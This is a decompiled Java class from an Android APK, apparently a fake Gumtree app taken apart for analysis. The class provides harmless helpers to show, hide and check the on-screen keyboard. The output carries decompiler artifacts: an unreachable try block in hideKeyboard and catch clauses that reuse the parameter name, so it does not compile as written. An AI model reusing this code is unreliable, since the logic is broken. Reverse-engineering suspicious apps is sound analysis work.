package com.gumsis.checktls;

import android.content.Context;
import android.util.Log;
import android.view.View;
import android.view.inputmethod.InputMethodManager;

public class KbdTls
{
  public static void hideKeyboard(View paramView)
  {
    if (paramView == null) {}
    for (;;)
    {
      return;
      try
      {
        InputMethodManager localInputMethodManager = (InputMethodManager)paramView.getContext().getSystemService("input_method");
        if (localInputMethodManager.isActive())
        {
          localInputMethodManager.hideSoftInputFromWindow(paramView.getWindowToken(), 0);
          return;
        }
      }
      catch (Exception paramView)
      {
        Log.d("KbdTls", "Ignore!");
      }
    }
  }
  
  public static boolean isKeyboardShowed(View paramView)
  {
    if (paramView == null) {
      return false;
    }
    try
    {
      boolean bool = ((InputMethodManager)paramView.getContext().getSystemService("input_method")).isActive(paramView);
      return bool;
    }
    catch (Exception paramView)
    {
      Log.d("KbdTls", "Ignore!");
    }
    return false;
  }
  
  public static void showKeyboard(View paramView)
  {
    if (paramView == null) {
      return;
    }
    try
    {
      ((InputMethodManager)paramView.getContext().getSystemService("input_method")).showSoftInput(paramView, 1);
      return;
    }
    catch (Exception paramView)
    {
      Log.d("KbdTls", "Ignore!");
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/KbdTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */